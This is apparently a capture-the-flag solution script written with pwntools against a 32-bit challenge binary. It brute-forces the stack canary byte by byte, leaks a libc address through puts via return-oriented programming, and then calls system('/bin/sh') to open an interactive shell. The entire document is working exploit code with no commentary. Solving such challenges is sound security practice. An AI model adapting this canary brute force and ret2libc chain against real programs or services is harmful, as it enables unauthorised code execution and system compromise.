from pwn import *
context.binary=exe=ELF('./chall',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
p=process('./chall')
#p=remote('chall.v1t.site', 30130)

canary = b'\x00'
for j in range(3):
    for i in range(0x00, 0xff):
        if i==0xa: continue
        p.sendlineafter(b'secret: ', b'a'*72 + canary + p8(i))
        out = p.recvuntil(b'next seeker.')
        if b'*** stack smashing detected ***: terminated' not in out:
            canary += p8(i)
            print(canary)
            break

payload=flat(
    b'a'*72+canary,
    p32(0)*3,
    p32(exe.plt['puts']),
    p32(0x80491f6),
    p32(exe.got['puts']),
)
#input()
p.sendlineafter(b'secret: ',payload)
sleep(3)
#print(p.recv())
libc.address=u32(p.recv()[20:24])-libc.sym['puts']
log.info(f"libc: {hex(libc.address)}")

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))

payload = flat(
    b'A'*72+canary,
    p32(0)*3,
    libc.sym['system'],
    p32(0), 
    binsh
    
)
p.sendline(payload)
p.interactive()

